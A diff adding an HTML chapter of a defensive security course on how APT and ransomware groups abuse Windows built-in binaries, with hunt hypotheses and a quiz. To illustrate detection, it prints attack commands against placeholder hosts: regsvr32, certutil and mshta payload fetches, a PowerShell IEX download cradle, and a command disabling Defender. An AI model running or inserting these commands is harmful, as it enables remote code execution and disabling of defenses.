@@ -1,0 +1,321 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="chapter-id" content="07"><meta name="module-id" content="lolbas">
+  <title>Threat Actor Campaigns · LOLBAS · H3AD-LEARN</title>
+  <link rel="icon" href="https://h3ad-sec.github.io/fevicon.png?v=2026">
+  <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head><body>
+  <div class="reading-progress" id="readingProgress"></div>
+  <header class="site-header"><div class="header-inner">
+    <div class="header-left">
+      <a href="../index.html" class="logo-link"><img src="https://raw.githubusercontent.com/h3ad-sec/h3ad-sec.github.io/main/logo-dark.png" id="site-logo" class="site-logo" alt="H3AD-SEC" height="32"></a>
+      <div class="nav-pill"><span class="nav-pill-name">H3AD-LEARN</span><span class="nav-pill-sep">·</span><span class="nav-pill-tagline">THREAT ACTOR CAMPAIGNS</span></div>
+    </div>
+    <nav class="header-nav">
+      <a href="../index.html" class="nav-link">Hub</a>
+      <a href="index.html" class="nav-link">LOLBAS</a>
+      <a href="../threat-hunting/index.html" class="nav-link">Threat Hunting</a>
+    </nav>
+    <div class="header-actions">
+      <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+      </button>
+    </div>
+  </div></header>
+
+  <div class="chapter-layout">
+    <aside class="toc-sidebar" id="tocSidebar">
+      <a href="index.html" class="toc-back-link">&#8592; LOLBAS</a>
+      <div class="toc-chapter-info">
+        <span class="mono accent" style="font-size:0.75rem;letter-spacing:0.1em;">CHAPTER 07 of 8</span>
+        <span class="muted" style="font-size:0.75rem;font-family:var(--font-mono)">35 MIN READ</span>
+      </div>
+      <nav class="toc-nav" id="tocNav"><!-- JS-populated --></nav>
+      <div class="toc-progress">
+        <span class="section-label" style="font-size:0.55rem;letter-spacing:0.2em;color:var(--muted);font-family:var(--font-mono)">PROGRESS</span>
+        <div class="toc-progress-bar"><div class="toc-progress-fill" id="chapterProgressFill"></div></div>
+        <span class="muted" style="font-size:0.72rem;font-family:var(--font-mono)" id="chapterProgressLabel">0 of 6 sections</span>
+      </div>
+    </aside>
+
+    <main class="chapter-body" id="chapterBody"><article>
+      <header class="chapter-header">
+        <div class="chapter-meta">
+          <span class="badge-module mono">CHAPTER 07</span>
+          <span class="badge-time muted mono">35 MIN READ</span>
+          <span class="badge-diff badge-advanced">ADVANCED</span>
+        </div>
+        <h1 class="chapter-title">Threat Actor Campaigns</h1>
+        <p class="chapter-intro">Nation-state APTs and ransomware operators converged on LOLBin tradecraft independently, for the same operational reason: operational security. This chapter maps specific actor campaigns to specific techniques, and translates that intelligence into hunt hypotheses.</p>
+        <div class="chapter-tags">
+          <span class="tag">APT</span>
+          <span class="tag">ransomware</span>
+          <span class="tag">Cobalt Strike</span>
+          <span class="tag">campaign attribution</span>
+        </div>
+      </header>
+
+      <!-- SECTION 1 -->
+      <section class="chapter-section" id="why-actors-use-lolbins">
+        <h2>Why Threat Actors Choose Living Off the Land</h2>
+        <p>Nation-state APTs and ransomware operators converged on LOLBin tradecraft independently. The convergence happened because both groups optimized for the same thing: remaining undetected long enough to complete their objectives.</p>
+        <p>Three operational reasons actors choose LOLBins over custom malware:</p>
+        <ol>
+          <li><strong>Blend into noise.</strong> Security tools cannot blocklist certutil or PowerShell without breaking operations. A custom implant binary can be hashed, yara'd, and blocked. A PowerShell command cannot be blocked without disabling PowerShell entirely.</li>
+          <li><strong>Reduce tooling cost.</strong> LOLBins are pre-installed and signed. Attackers do not need to develop, compile, sign, or maintain a custom dropper. The payload is already on the target system before the attack begins.</li>
+          <li><strong>Reduce dwell detection risk.</strong> Custom malware triggers more alerts. LOLBin executions trigger alerts only when context anomalies exist. Less experienced SOCs miss the context and triage the alert as benign.</li>
+        </ol>
+        <p>The term "LOTL" (Living Off The Land) appears throughout threat intelligence reports to describe this pattern. MITRE ATT&CK labels it T1218 (Signed Binary Proxy Execution) and a cluster of related subtechniques. Every T1218 subtechnique has a corresponding LOLBin at the center.</p>
+
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Actor Tier</th>
+                <th>LOLBin Usage Pattern</th>
+                <th>Detection Challenge</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Nation-state APT</td>
+                <td>Multi-stage chains; each LOLBin fetches the next stage. Low execution velocity. Targeted hosts only.</td>
+                <td>Low volume, manual pacing, no signature. Blends with admin activity.</td>
+              </tr>
+              <tr>
+                <td>Ransomware operator</td>
+                <td>Sequential phases: download, lateral movement, AV kill, encrypt. Higher velocity.</td>
+                <td>Higher volume but short time window. Often detected late in kill chain.</td>
+              </tr>
+              <tr>
+                <td>Commodity threat</td>
+                <td>Single-stage cradle. PowerShell or mshta pointing to commodity C2.</td>
+                <td>Higher volume, easier to detect, but high false-positive burden on analysts.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- SECTION 2 -->
+      <section class="chapter-section" id="apt-campaigns">
+        <h2>APT Campaign Examples</h2>
+        <p>Three nation-state actors illustrate how LOLBin preferences vary by group and inform attribution.</p>
+
+        <h3>APT32 (OceanLotus / Cobalt Kitty)</h3>
+        <p>Vietnamese threat actor, primarily targeting Southeast Asian organizations. APT32 used regsvr32 Squiblydoo to load COM scriptlets directly from C2 infrastructure. The complete execution chain:</p>
+        <div class="code-block">
+          <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+          <pre><code>regsvr32 /s /u /i:http://C2/scrobj.sct scrobj.dll</code></pre>
+        </div>
+        <p>The group also used PowerShell download cradles to fetch secondary payloads directly into memory, leaving no file on disk. Detection significance: regsvr32 with a remote URL in the CommandLine is extremely rare in legitimate environments. Any occurrence warrants immediate investigation.</p>
+
+        <h3>APT34 (OilRig / Helix Kitten)</h3>
+        <p>Iranian threat actor targeting Middle East energy and government organizations. APT34 consistently used certutil to download payloads disguised as certificate or media files:</p>
+        <div class="code-block">
+          <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+          <pre><code>certutil -urlcache -f http://C2/payload.jpg C:\Users\Public\payload.jpg</code></pre>
+        </div>
+        <p>The downloaded file carried a .jpg or .pdf extension but contained a PE binary. The group also used mshta.exe with embedded VBScript via HTA files, and established persistence through scheduled tasks pointing to mshta.exe with a C2 URL. This certutil download pattern is APT34's most consistent and recognizable signature across multiple campaigns.</p>
+
+        <h3>Lazarus Group (DPRK)</h3>
+        <p>North Korean threat actor. Lazarus used PowerShell extensively across campaigns: encoded commands, IEX download cradles, and in-memory .NET assembly loading via Reflection. The characteristic command pattern:</p>
+        <div class="code-block">
+          <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+          <pre><code>powershell.exe -nop -w hidden -enc [very long base64 string]</code></pre>
+        </div>
+        <p>After initial compromise, Lazarus also used wmic.exe for lateral movement across the victim network. The combination of PowerShell IEX for initial delivery and wmic for lateral spread is a consistent behavioral signature across Lazarus campaigns spanning multiple years.</p>
+      </section>
+
+      <!-- SECTION 3 -->
+      <section class="chapter-section" id="ransomware-campaigns">
+        <h2>Ransomware Operator LOLBin Patterns</h2>
+        <p>Ransomware operators adopted LOTL tradecraft in the 2020s to defeat endpoint security deployed after WannaCry and NotPetya. The pattern emerged because endpoint controls improved: operators who continued using custom malware were getting caught. LOLBins provided a path around improved defenses without requiring malware redevelopment.</p>
+
+        <h3>BlackMatter / DarkSide (2020-2021)</h3>
+        <p>Pre-encryption steps followed a documented sequence: PowerShell or certutil to download the ransomware payload, wmic /node: for lateral movement to spread across domain members, and a LOLDriver (mhyprot2.sys, a vulnerable game driver) to kill AV and EDR processes before the encryption run began. The LOLDriver step is notable because it required the operator to bring a known-vulnerable driver, not a built-in binary -- a BYOVD (Bring Your Own Vulnerable Driver) technique that became common in enterprise ransomware.</p>
+
+        <h3>LockBit 3.0</h3>
+        <p>LockBit affiliates were observed using certutil.exe to download tools after gaining domain access, PowerShell to disable Windows Defender before encryption:</p>
+        <div class="code-block">
+          <div class="code-block-header"><span class="code-block-lang">POWERSHELL</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+          <pre><code>Set-MpPreference -DisableRealtimeMonitoring $true</code></pre>
+        </div>
+        <p>schtasks was used to establish persistence before the encryption phase. LockBit's LOLBin usage is consistent enough across affiliates that detection rules targeting these specific patterns catch LockBit activity reliably.</p>
+
+        <h3>Conti (affiliates)</h3>
+        <p>The Conti affiliate playbook, leaked in 2021, provided direct written evidence of systematically documented LOTL procedures. wmic /node: for SMB lateral movement, PowerShell download cradles for Cobalt Strike beacon delivery, and bitsadmin for downloading post-exploitation tools were all documented step-by-step in the training materials provided to affiliates.</p>
+
+        <div class="callout-info"><strong>Note:</strong> The Conti playbook leak confirmed what detection engineers had long suspected: LOTL is not opportunistic. Affiliates receive documented, step-by-step instructions including exact wmic and PowerShell syntax. This makes the techniques consistent across affiliates and therefore highly detectable through behavioral patterns.</div>
+
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Ransomware Group</th>
+                <th>LOLBin(s) Used</th>
+                <th>Phase</th>
+                <th>Technique ID</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>BlackMatter / DarkSide</td>
+                <td>certutil, PowerShell, wmic, LOLDriver (mhyprot2.sys)</td>
+                <td>Download, Lateral Movement, Defense Evasion</td>
+                <td>T1105, T1047, T1068</td>
+              </tr>
+              <tr>
+                <td>LockBit 3.0</td>
+                <td>certutil, PowerShell (Set-MpPreference), schtasks</td>
+                <td>Download, Defense Impairment, Persistence</td>
+                <td>T1105, T1562.001, T1053.005</td>
+              </tr>
+              <tr>
+                <td>Conti (affiliates)</td>
+                <td>wmic, PowerShell (IEX cradle), bitsadmin</td>
+                <td>Lateral Movement, C2 Delivery, Tool Transfer</td>
+                <td>T1047, T1059.001, T1197</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- SECTION 4 -->
+      <section class="chapter-section" id="cobalt-strike-lotl">
+        <h2>Cobalt Strike and LOTL Integration</h2>
+        <p>Cobalt Strike is a legitimate adversary simulation tool widely abused by ransomware operators and nation-state actors alike. Every common Cobalt Strike beacon delivery method relies on a LOLBin. This is not coincidence -- the framework was designed for red team engagements where avoiding detection is the goal, and LOLBins are the best available delivery mechanism.</p>
+
+        <h3>mshta stager</h3>
+        <p>mshta.exe fetches an HTA file from the team server. The HTA contains VBScript that executes shellcode or downloads and executes the beacon. This is the most common initial beacon delivery method seen in commodity intrusions. The command is simple:</p>
+        <div class="code-block">
+          <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+          <pre><code>mshta.exe http://teamserver.domain/payload.hta</code></pre>
+        </div>
+
+        <h3>PowerShell download cradle stager</h3>
+        <p>Loads the Cobalt Strike PowerShell beacon in memory. No file ever touches disk:</p>
+        <div class="code-block">
+          <div class="code-block-header"><span class="code-block-lang">POWERSHELL</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+          <pre><code>IEX (New-Object Net.WebClient).DownloadString('http://TS/payload')</code></pre>
+        </div>
+
+        <h3>regsvr32 stager</h3>
+        <p>Downloads and executes a COM scriptlet that runs shellcode within the regsvr32.exe process:</p>
+        <div class="code-block">
+          <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+          <pre><code>regsvr32 /s /u /i:http://TS/beacon.sct scrobj.dll</code></pre>
+        </div>
+
+        <h3>rundll32 stager</h3>
+        <p>Loads a beacon DLL that was dropped to a writable path:</p>
+        <div class="code-block">
+          <div class="code-block-header"><span class="code-block-lang">CMD</span><button class="code-copy-btn" aria-label="Copy code">Copy</button></div>
+          <pre><code>rundll32.exe C:\Temp\beacon.dll,DllMain</code></pre>
+        </div>
+
+        <p>The mshta and PowerShell variants are fully in-memory. No persistent beacon file exists. All four stager types produce high-signal parent-child anomalies or CommandLine patterns. The common thread is a CommandLine containing a team server URL or a short-lived domain.</p>
+
+        <div class="callout-warning"><strong>Important:</strong> "Cobalt Strike" in a process CommandLine is virtually impossible to find. The indicators are the delivery mechanism: mshta URL, regsvr32 URL, PowerShell IEX. Defenders must detect the LOLBin behavior, not the C2 tool name.</div>
+      </section>
+
+      <!-- SECTION 5 -->
+      <section class="chapter-section" id="campaign-attribution">
+        <h2>Attribution Signals in LOLBin Campaigns</h2>
+        <p>Not all LOTL usage is the same. Actor-specific patterns exist that persist across campaigns and can support attribution before formal intelligence reporting arrives.</p>
+
+        <p><strong>C2 infrastructure patterns.</strong> Nation-state actors typically use long-lived domains with valid TLS certificates, often mimicking Microsoft, Google, or cloud service providers. Ransomware operators frequently use freshly registered domains or bullet-proof hosting providers with no enterprise reputation.</p>
+
+        <p><strong>LOLBin selection consistency.</strong> APT groups reuse specific techniques across campaigns. APT34 consistently used certutil and mshta. APT32 consistently used regsvr32. Tracking per-actor LOLBin preferences builds a behavioral signature that helps attribute new intrusions even without matching IOCs from previous campaigns.</p>
+
+        <p><strong>Staging depth.</strong> Nation-state actors run multi-stage chains where each LOLBin fetches the next stage from a separate infrastructure component. Ransomware operators typically use 2-3 stages maximum. Commodity threat actors usually use 1-2 stages.</p>
+
+        <p><strong>Timing and velocity.</strong> Nation-state APT reconnaissance via wmic or nltest runs slowly and manually -- commands are spaced across hours, targeting specific hosts. Ransomware lateral movement via wmic /node: runs fast and automated across IP ranges. The velocity of LOLBin execution is an attribution signal on its own.</p>
+
+        <div class="callout-tip"><strong>Tip:</strong> When a compromise is identified, map all LOLBin executions by timeline. The pattern -- which binaries, what order, what speed -- often matches known actor playbooks and accelerates attribution before formal intelligence reporting arrives.</div>
+      </section>
+
+      <!-- SECTION 6 -->
+      <section class="chapter-section" id="hunting-actor-patterns">
+        <h2>Hunting for Actor-Specific LOLBin Patterns</h2>
+        <p>Published threat intelligence translates directly into hunt hypotheses. The process is mechanical: take an actor's documented LOLBin technique, state it as a conditional ("if this actor has access, we expect to see..."), and build a query from the expected artifact. Three examples:</p>
+
+        <h3>Hypothesis 1 -- APT34-like certutil abuse</h3>
+        <p>If APT34 has access to this network, we expect to see certutil using -urlcache to download a file with a non-executable extension that is actually a PE binary.</p>
+        <p>Hunt: certutil CommandLine contains -urlcache plus a destination filename with extension in {.jpg, .png, .pdf, .txt, .dat} that does not resolve to a known CDN. Enrich with file type detection on the downloaded file to confirm the extension mismatch.</p>
+
+        <h3>Hypothesis 2 -- Cobalt Strike mshta stager</h3>
+        <p>If an initial access broker used mshta for beacon delivery, mshta will appear in the process tree with no legitimate parent and a URL argument pointing to a short-lived domain.</p>
+        <p>Hunt: mshta CommandLine contains http and parent process is not explorer.exe, plus domain age under 30 days (enriched via passive DNS or threat intelligence).</p>
+
+        <h3>Hypothesis 3 -- Ransomware wmic lateral movement</h3>
+        <p>If ransomware operators gained domain access, we expect wmic /node: targeting multiple internal hosts within a short time window from a single source.</p>
+        <p>Hunt: wmic.exe CommandLine contains /node: where the same source host targets five or more unique internal IPs within a 60-minute window.</p>
+
+        <p>These three hypotheses cover three distinct threat actor archetypes using three different LOLBins. Threat actor LOLBin patterns from published CTI reports are the highest-quality source of hunt hypotheses available. Every APT report with ATT&CK technique mappings is a set of ready-made hunt hypotheses waiting to be written into queries.</p>
+      </section>
+
+      <div class="chapter-summary">
+        <h3>Key Takeaways</h3>
+        <ul>
+          <li>Nation-state APTs and ransomware operators both chose LOTL tradecraft to reduce dwell detection risk and blend LOLBin executions into baseline noise.</li>
+          <li>APT34 used certutil to download payloads disguised as benign file extensions. APT32 used regsvr32 Squiblydoo. Lazarus used PowerShell IEX cradles. Each group has consistent LOLBin preferences across campaigns.</li>
+          <li>Ransomware operators (BlackMatter, LockBit, Conti) use LOLBins sequentially: download phase, lateral movement phase, AV/EDR kill phase. The leaked Conti playbook confirmed LOTL is procedurally documented in affiliate training.</li>
+          <li>Cobalt Strike uses LOLBins for every common stager delivery method. Defenders detect the LOLBin behavior, not the tool name.</li>
+          <li>Actor attribution in LOTL intrusions uses LOLBin selection pattern, C2 infrastructure type, staging depth, and movement velocity alongside traditional indicators.</li>
+          <li>Published CTI reports with ATT&CK technique mappings are direct sources of hunt hypotheses. Each actor-specific technique is a ready-made hypothesis: "if [actor] has access, we expect to see [LOLBin pattern]."</li>
+        </ul>
+      </div>
+
+      <div class="knowledge-check">
+        <h3 class="kc-title">Knowledge Check</h3>
+        <p class="kc-intro muted">Click an answer to reveal the explanation.</p>
+
+        <div class="kc-question">
+          <p class="kc-prompt">The Conti ransomware affiliate playbook leak in 2021 was significant for detection engineers because it revealed what?</p>
+          <div class="kc-options">
+            <button class="kc-option" data-correct="false">A. The specific zero-day vulnerabilities Conti used for initial access</button>
+            <button class="kc-option" data-correct="true">B. That LOTL tradecraft (wmic, PowerShell) is systematically documented in affiliate training procedures</button>
+            <button class="kc-option" data-correct="false">C. Conti used custom malware rather than LOLBins</button>
+            <button class="kc-option" data-correct="false">D. The ransomware payment infrastructure used by Conti operators</button>
+          </div>
+          <div class="kc-answer">The Conti playbook leak confirmed that LOTL tradecraft is not improvised by individual attackers but systematically trained. The playbook included step-by-step wmic and PowerShell syntax for lateral movement. This validated the detection engineering approach of building comprehensive LOLBin coverage: if affiliates are trained to follow these procedures, the procedures are consistent and therefore detectable through behavioral patterns.</div>
+        </div>
+
+        <div class="kc-question">
+          <p class="kc-prompt">Cobalt Strike's mshta stager is detected through what behavioral indicator?</p>
+          <div class="kc-options">
+            <button class="kc-option" data-correct="false">A. The presence of a file named cobalt_strike_beacon.exe</button>
+            <button class="kc-option" data-correct="true">B. mshta.exe CommandLine containing a URL with no legitimate parent process context</button>
+            <button class="kc-option" data-correct="false">C. A specific registry key written by the Cobalt Strike installer</button>
+            <button class="kc-option" data-correct="false">D. The use of port 443 for outbound connections</button>
+          </div>
+          <div class="kc-answer">Cobalt Strike does not write its name anywhere accessible to detection. The stager executes via a trusted LOLBin (mshta). The detection indicator is the behavior: mshta.exe with a URL in CommandLine, no legitimate parent process explaining why a user would open an HTA from a web URL, and a network connection to a domain with no enterprise reputation. The tool's identity is unknowable without memory analysis. The delivery mechanism is detectable.</div>
+        </div>
+
+        <div class="kc-question">
+          <p class="kc-prompt">Which behavioral characteristic most distinguishes nation-state APT wmic reconnaissance from ransomware lateral movement using wmic?</p>
+          <div class="kc-options">
+            <button class="kc-option" data-correct="false">A. Nation-state actors use wmic on Linux, ransomware operators use it on Windows</button>
+            <button class="kc-option" data-correct="true">B. Nation-state reconnaissance runs slowly and manually; ransomware lateral movement runs fast across many targets within minutes</button>
+            <button class="kc-option" data-correct="false">C. Nation-state actors sign their wmic commands; ransomware operators do not</button>
+            <button class="kc-option" data-correct="false">D. Ransomware operators use wmic /node: only with SYSTEM privileges</button>
+          </div>
+          <div class="kc-answer">Nation-state APT operators run targeted, careful reconnaissance. wmic queries are spaced out, targeted, and manual. Ransomware operators automate lateral movement: once inside the domain, automated scripts iterate through IP ranges. The velocity signal -- one source host contacting 10 or 20 internal targets with wmic /node: within a few minutes -- is a strong ransomware indicator. A nation-state actor doing the same recon over hours is harder to distinguish from individual admin operations, requiring additional context signals.</div>
+        </div>
+      </div>
+
+      <nav class="chapter-nav">
+        <a href="06-detection-queries.html" class="chapter-nav-prev">&#8592; Detection Queries</a>
+        <a href="08-advanced-evasion.html" class="chapter-nav-next">Advanced Evasion &#8594;</a>
+      </nav>
+    </article></main>
+  </div>
+
+  <script src="../js/learn.js"></script>
+  <script>document.addEventListener('DOMContentLoaded', () => initChapter('07', 6));</script>
+</body></html>
